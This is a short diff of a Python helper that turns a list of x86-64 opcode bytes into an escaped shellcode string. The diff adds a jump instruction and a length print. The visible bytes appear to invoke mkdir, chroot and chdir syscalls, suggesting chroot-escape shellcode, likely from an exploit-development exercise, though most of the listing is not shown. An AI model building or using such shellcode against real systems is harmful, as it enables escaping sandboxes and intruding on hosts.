@@ -1,4 +1,5 @@
 p = """
+eb 00               
 6a 53               
 58                  
 6a 2e               
@@ -14,7 +15,6 @@ b8 a1 00 00 00
 51                  
 66 52               
 b1 64               
-
 b8 50 00 00 00      
 48 89 e7            
 51                  
@@ -44,6 +44,6 @@ for a in asm:
     x = a.strip()
     b.append(x)
 x = ''.join(b).replace(" ","")
-#
+#print(len(x))
 print("\\x".join(a+b for a,b in zip(x[::2],x[1::2])))
 
